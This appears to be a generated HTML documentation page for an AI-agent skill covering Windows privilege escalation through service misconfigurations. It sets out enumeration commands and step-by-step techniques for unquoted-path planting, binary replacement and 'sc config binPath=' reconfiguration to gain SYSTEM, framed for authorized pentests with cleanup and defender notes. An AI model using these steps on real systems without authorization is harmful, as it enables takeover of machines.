@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: privesc-windows-vectors-service-misconfigurations</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>privesc-windows-vectors-service-misconfigurations</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when authorized Windows privilege escalation focuses on</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-windows-vectors.html">privesc-windows-vectors</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-windows-vectors.html">privesc-windows-vectors</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-windows.html">privesc-windows</a> <a href="privesc-windows-vectors-token-manipulation.html">privesc-windows-vectors-token-manipulation</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>winpeas</td><td>2024</td></tr><tr><td>PowerShell</td><td>7.4</td></tr><tr><td>accesschk</td><td>6.1</td></tr></tbody></table><p>Windows services commonly run as SYSTEM, so any misconfiguration that lets a low-privilege user influence what a service executes is a direct path to SYSTEM on an authorized engagement. This sub-skill covers the complete service attack surface: enumeration, unquoted service paths, writable binaries and directories, and weak service ACLs that permit reconfiguration. Scope is authorized penetration tests, labs, and CTFs only.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Enumerate all services with their binary paths and start accounts: <code>Get-CimInstance Win32_Service</code> or WinPEAS output.</li>
+<li>Flag services running as SYSTEM or LocalService with paths outside <code>C:\Windows</code>, missing quotes, or writable components.</li>
+<li>Verify each candidate by hand: <code>sc qc &lt;name&gt;</code> for the path, <code>icacls</code> on every path component for writability.</li>
+<li>Exploit the simplest candidate first: unquoted path planting, binary replacement, or service reconfiguration via weak ACLs.</li>
+<li>Restart or trigger the service and confirm SYSTEM with <code>whoami</code> from the payload.</li>
+<li>Restore the original binary and configuration, and document exact commands for the report.</li>
+</ol>
+<h2>1. Service enumeration</h2>
+<p>List services with the fields that matter: name, binary path, start mode, and the account it runs as.</p>
+<pre><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode, StartName | Format-Table -AutoSize</code></pre>
+<p>Example output shape: rows where <code>StartName</code> is <code>LocalSystem</code> and <code>PathName</code> points outside <code>C:\Windows</code> go on the shortlist. Also capture with the classic tools for cross-checking:</p>
+<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot;
+sc query state= all | findstr &quot;SERVICE_NAME&quot;</code></pre>
+<p>Record the exact <code>PathName</code> including quotes (or their absence); the quote check in section 2 depends on it.</p>
+<h2>2. Unquoted service paths</h2>
+<p>When a service path contains spaces and is not wrapped in quotes, Windows resolves it greedily from left to right, trying each space-separated prefix with <code>.exe</code> appended.</p>
+<pre><code class="language-cmd">sc qc VulnService</code></pre>
+<p>Example output shape:</p>
+<pre><code>BINARY_PATH_NAME   : C:\Program Files\Vuln App\service.exe</code></pre>
+<p>Windows tries <code>C:\Program.exe</code>, then <code>C:\Program Files\Vuln.exe</code>, then <code>C:\Program Files\Vuln App\service.exe</code>. Check writability of each parent directory:</p>
+<pre><code class="language-cmd">icacls &quot;C:\Program Files\Vuln App&quot;
+icacls &quot;C:\Program Files&quot;
+icacls C:\</code></pre>
+<p>If <code>C:\Program Files\Vuln.exe</code> is writable (the <code>Vuln App</code> directory grants you write, or the path component does), plant your payload there with that exact name. When the service restarts, Windows executes your binary as SYSTEM before ever reaching the real path. Then restart the service if your privileges allow, or wait for a reboot:</p>
+<pre><code class="language-cmd">sc stop VulnService
+sc start VulnService</code></pre>
+<h2>3. Writable service binaries and directories</h2>
+<p>Even with proper quoting, a service binary or its directory may grant you write access, which means direct replacement.</p>
+<pre><code class="language-cmd">icacls &quot;C:\Program Files\VulnApp\service.exe&quot;
+accesschk.exe -qv &quot;C:\Program Files\VulnApp\service.exe&quot;</code></pre>
+<p>Example output shape: an <code>icacls</code> line like <code>BUILTIN\Users:(I)(M)</code> (modify rights for Users) on the binary means you can overwrite it. Back up the original, replace it with your payload, restart the service, collect SYSTEM, then restore the original binary and restart again. If only the directory is writable, the same replacement works, and a writable directory also enables DLL planting alongside the binary.</p>
+<h2>4. Weak service ACLs and reconfiguration</h2>
+<p>Service ACLs may grant you <code>SERVICE_CHANGE_CONFIG</code>, which lets you rewrite the binary path to anything you control.</p>
+<pre><code class="language-cmd">accesschk.exe -ucqv VulnService
+sc sdshow VulnService</code></pre>
+<p>Example output shape: accesschk reporting <code>SERVICE_CHANGE_CONFIG</code> for your user, or an SDDL string granting your SID <code>RPWP</code> style rights. Reconfigure the service to run your payload:</p>
+<pre><code class="language-cmd">sc config VulnService binPath= &quot;C:\Users\app\pwn.exe&quot;
+sc stop VulnService
+sc start VulnService</code></pre>
+<p>Note the space after <code>binPath=</code>; <code>sc</code> requires it. Your payload runs as SYSTEM on start. Always record the original <code>binPath</code> from <code>sc qc</code> first so you can restore it, and restore it as part of cleanup.</p>
+<h2>5. Confirming SYSTEM and safe restarts</h2>
+<p>Payloads should prove privilege and stay quiet. A simple proof writes a marker file and the <code>whoami</code> output:</p>
+<pre><code class="language-cmd">C:\Users\app\pwn.exe</code></pre>
+<p>where <code>pwn.exe</code> executes <code>whoami &gt; C:\Users\app\proof.txt</code> as its first action. Example proof content: <code>nt authority\system</code>. Restarting services can disrupt the target: prefer <code>sc stop</code> and <code>sc start</code> on the vulnerable service only, never reboot the host on an engagement without explicit approval, and avoid touching services whose purpose you do not understand (database, backup, and security services can cause data loss or alerts when restarted).</p>
+<h2>Edge cases</h2>
+<ul>
+<li><code>sc config</code> syntax is unforgiving: <code>binPath= &quot;path&quot;</code> needs the space after the equals sign, and paths with spaces need quotes inside the value.</li>
+<li>Some services run as virtual accounts or managed service accounts rather than SYSTEM; check <code>StartName</code> because the payoff differs.</li>
+<li>Service executables may be protected by Windows Resource Protection or EDR file guards that restore or block replacement; verify the replacement actually persisted before restarting.</li>
+<li>Unquoted path planting fails when none of the prefix directories are writable; verify every prefix with <code>icacls</code>, not just the obvious one.</li>
+<li>Restarting a service you reconfigured may fail if the service has dependencies; check <code>sc qc</code> dependency lines and restart in order.</li>
+<li>On hardened hosts, AppLocker or WDAC may block your payload binary from executing even as SYSTEM; test execution as your own user first.</li>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>If no service is directly exploitable, check services running as named user accounts: their credentials or profile directories may be readable and lead to credential reuse.</li>
+<li>When service ACLs are tight but the binary directory is writable, combine binary replacement with DLL hijacking for a second chance at the same service.</li>
+<li>If service restarts are blocked, look for services configured with <code>SERVICE_AUTO_START</code> that will execute your planted binary at the next legitimate reboot within the engagement window.</li>
+<li>Pivot to the sibling sub-skills when services are clean: scheduled tasks and registry autoruns follow the same writable-component logic.</li>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders should audit service binary paths for quoting, enforce least-privilege service accounts instead of SYSTEM, monitor service configuration changes (Event ID 7045 for new services, 7036 for state changes), and alert on service binaries modified outside change windows. From the authorized tester side, service reconfiguration and binary replacement are logged in the System event log and are visible to EDR; keep a precise record of original values, restore everything, and note the exact event IDs your actions generated so the report&#x27;s detection section is accurate.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1543.003 (Windows Service)</li>
+<li>Microsoft sc.exe docs: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config</li>
+<li>AccessChk: https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk</li>
+<li>HackTricks services section: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services</li>
+<li>LOLBAS (payload binaries that evade naive blocklists): https://lolbas-project.github.io</li>
+<li>Microsoft service security: https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
